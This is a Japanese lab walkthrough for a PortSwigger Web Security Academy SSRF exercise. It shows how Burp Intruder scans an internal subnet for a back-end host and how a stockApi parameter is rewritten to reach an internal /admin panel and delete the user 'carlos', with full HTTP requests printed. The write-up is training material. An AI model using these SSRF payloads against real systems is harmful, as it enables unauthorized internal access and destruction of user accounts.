# 別のバックエンド システムに対する基本的な SSRF

以下のハッキングラボで実施します  
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

- 1. Burp Suite の Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. 製品ページにアクセスして、在庫チェックボタンを押します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/5957658d-acc4-4363-8b8f-c78111a95b39)

- 4. POST /product/stock HTTP/2 リクエストを send to intruder します

- 5. intruder タブに移動し、リクエストの第 4 オクテッドをパラメータ化します。

- 6. Payloads タブでパラメータ設定します。Payload type: Numbers で１から 255 まで 1 刻みで攻撃開始し、バックエンドシステムの IP をサーチします
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/f61e4bbb-7afe-4d7e-9644-4f400556575c)

* 7. サーチした結果、404 コードを返す端末(192.168.0.226)が見つかりました。
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/a5e9b008-873b-4acb-94eb-1b49da0ceebb)

* 7. burp Suite を intercept on にして再び在庫チェックボタンを押します

* 8. リクエストを以下のように書き換えて送信します
     [変更前]

```
POST /product/stock HTTP/2
Host: 0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Cookie: session=zUaOqGW1dbzMvA3O9hPJYARIiZ1h3w6h
Content-Length: 96
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

[変更後]

```
POST /product/stock HTTP/2
Host: 0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Cookie: session=zUaOqGW1dbzMvA3O9hPJYARIiZ1h3w6h
Content-Length: 96
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http%3A%2F%2F192.168.0.226%3A8080%2Fadmin
```

![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/a7ee5460-2100-4046-88eb-e3caa05fd2b8)

- 9. Delete ボタンのリンクをコピーしてパラメータを確認します
     https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net/http://192.168.0.226:8080/admin/delete?username=carlos

- 10. 再び在庫チェックボタンを押下してリクエストを書き換えます  
      [変更前]

```
POST /product/stock HTTP/2
Host: 0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Cookie: session=zUaOqGW1dbzMvA3O9hPJYARIiZ1h3w6h
Content-Length: 96
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

[変更後]

```
POST /product/stock HTTP/2
Host: 0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Cookie: session=zUaOqGW1dbzMvA3O9hPJYARIiZ1h3w6h
Content-Length: 96
Sec-Ch-Ua:
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a28006a0326d8d18163de5c0063008e.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8

stockApi=http%3A%2F%2F192.168.0.226%3A8080%2Fadmin%2Fdelete?username=carlos
```

これで一般ユーザーの削除が出来ました
